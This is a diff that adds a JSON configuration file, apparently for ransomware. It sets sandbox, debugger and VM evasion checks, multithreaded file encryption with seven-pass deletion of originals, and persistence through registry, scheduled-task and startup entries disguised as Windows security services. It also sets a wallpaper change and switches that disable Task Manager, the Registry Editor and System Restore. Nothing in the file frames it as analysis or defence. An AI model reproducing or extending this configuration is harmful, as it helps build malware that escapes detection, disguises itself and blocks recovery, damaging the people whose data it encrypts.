@@ -1,0 +1,48 @@
+{
+  "execution": {
+    "delay_start": 30,
+    "check_sandbox": true,
+    "check_debugger": true,
+    "check_vm": true,
+    "minimum_ram_gb": 4,
+    "minimum_disk_gb": 100,
+    "minimum_cpu_cores": 2
+  },
+  
+  "encryption": {
+    "threads": 8,
+    "chunk_size": 1048576,
+    "progress_callback": true,
+    "verify_integrity": true,
+    "secure_delete_passes": 7
+  },
+  
+  "persistence": {
+    "methods": ["registry", "scheduled_task", "startup_folder"],
+    "service_name": "WindowsSecurityService",
+    "task_name": "SystemSecurityUpdate",
+    "startup_name": "SecurityCheck"
+  },
+  
+  "network": {
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "connect_timeout": 30,
+    "read_timeout": 60,
+    "max_redirects": 5
+  },
+  
+  "logging": {
+    "file": "system_log.enc",
+    "max_size": 5242880,
+    "encrypt": true,
+    "debug": false
+  },
+  
+  "ui": {
+    "show_progress": false,
+    "change_wallpaper": true,
+    "disable_task_manager": true,
+    "disable_registry_editor": true,
+    "disable_system_restore": true
+  }
+}
